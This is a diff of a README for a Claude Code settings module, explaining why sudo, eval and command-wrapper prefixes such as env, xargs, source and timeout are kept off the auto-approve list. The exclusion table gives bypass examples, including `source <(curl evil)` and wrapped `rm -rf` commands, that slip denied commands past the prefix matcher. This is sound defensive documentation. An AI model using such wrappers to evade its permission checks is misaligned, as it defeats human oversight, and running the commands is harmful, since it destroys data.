@@ -6,7 +6,7 @@ Base settings.json with comprehensive tool permissions (800+ allow entries), den
 
 This module provides a `settings.base.json` that gets merged into `~/.claude/settings.json`. It includes:
 
-- **Allow list**: ~800 Bash command prefixes covering git, package managers, build tools, languages, editors, system utilities, cloud CLIs, databases, and more. Privilege-escalation and arbitrary-execution prefixes (`sudo`, `su`, `doas`, `eval`, `exec`) are deliberately **excluded** — see "Excluded from the allow list" below.
+- **Allow list**: ~800 Bash command prefixes covering git, package managers, build tools, languages, editors, system utilities, cloud CLIs, databases, and more. Privilege-escalation / arbitrary-execution prefixes (`sudo`, `su`, `doas`, `eval`, `exec`) and command-wrapper prefixes that run an arbitrary following command (`command`, `source`, `.`, `builtin`, `env`, `xargs`, `nohup`, `timeout`, `watch`, `nice`, `time`, `parallel`, `caffeinate`) are deliberately **excluded** — see "Excluded from the allow list" below.
 - **File operation permissions**: Read/Edit/Write permissions for your code directory, Claude config, and temp files
 - **Deny list**: 13 entries for dangerous operations (rm -rf, force push to main, docker rm, DROP/TRUNCATE/DELETE SQL). Several legacy entries were pruned in #474 once the `hooks` module gained bypass-proof `hard_block()` enforcement — see "Deny list rationale" below.
 - **Tool permissions**: WebFetch, WebSearch, Skill, Glob, Grep, and Supabase MCP tools pre-approved
@@ -27,7 +27,7 @@ Each entry survives a specific test: would removing it create a real new risk af
 Removed in #474 (now redundant with hook hard-blocks):
 - `Bash(git push --force main:*)`, `Bash(git push -f main:*)`, `Bash(git push --force-with-lease origin main:*)`, `Bash(git push -f origin main:*)` — all subsumed by `check-careful.py:_is_force_push_to_main()`.
 
-### Excluded from the allow list (#665)
+### Excluded from the allow list (#665, #711)
 
 The allow list intentionally does **not** grant these prefixes:
 
@@ -35,8 +35,13 @@ The allow list intentionally does **not** grant these prefixes:
 |-----------------|-----------------------------------|
 | `Bash(sudo:*)`, `Bash(su:*)`, `Bash(doas:*)` | Privilege escalation. An auto-approved `sudo` runs *anything* as root, sidestepping every per-command guard. |
 | `Bash(eval:*)`, `Bash(exec:*)` | Arbitrary execution. The permission matcher only sees the literal prefix (`eval`, `exec`), so `eval "rm -rf /"` would be auto-approved even though `Bash(rm -rf:*)` is on the deny list. These prefixes defeat both the deny list and every argument-pattern allow rule. |
+| `Bash(command:*)`, `Bash(builtin:*)` | Same matcher-bypass class as `eval`/`exec`. `command rm -rf x` and `builtin eval "rm -rf /"` run the denied command — the matcher only ever sees the wrapper word. |
+| `Bash(source:*)`, `Bash(.:*)` | Run arbitrary script from a file or process substitution (`source <(curl evil)`, `. <(...)`). Whatever the sourced script does is never seen by the matcher. `.` is the POSIX synonym for `source` and carries the identical risk. |
+| `Bash(env:*)`, `Bash(xargs:*)`, `Bash(nohup:*)`, `Bash(timeout:*)`, `Bash(watch:*)`, `Bash(nice:*)`, `Bash(time:*)`, `Bash(parallel:*)`, `Bash(caffeinate:*)` | Command wrappers: each takes a following command and runs it. `env rm -rf x`, `timeout 5 rm -rf x`, `xargs rm -rf <<< x`, `nohup rm -rf x`, etc. all slip a denied command past the prefix matcher. |
 
-These were removed in #665. The deny list takes precedence over the allow list in Claude Code's permission model, but it can only override commands it actually names — `eval`/`exec` let a caller smuggle a denied command past the matcher entirely, so the only safe fix is to keep them off the allow list. With these prefixes excluded, such commands fall through to `defaultMode` (`ask`) and prompt for approval.
+#665 removed the privilege-escalation / arbitrary-execution prefixes; #711 removed the remaining command-wrapper prefixes. The deny list takes precedence over the allow list in Claude Code's permission model, but it can only override commands it actually names — every prefix above lets a caller smuggle a denied command past the matcher entirely, so the only safe fix is to keep them off the allow list. With these prefixes excluded, such commands fall through to `defaultMode` (`ask`) and prompt for approval.
+
+**Intentionally kept** (NOT excluded): ordinary builtins that do not take a command argument (`let`, `enable`, `set`, `export`, `printenv`, `renice`, `:`, `test`) stay allowed. `find` is kept despite `-exec` because it is a core read-only utility whose normal use does not run commands, and `ssh` is kept because it executes on a remote host, not against the local deny list. These do not function as local matcher-bypass wrappers.
 
 ## Template Variables
 
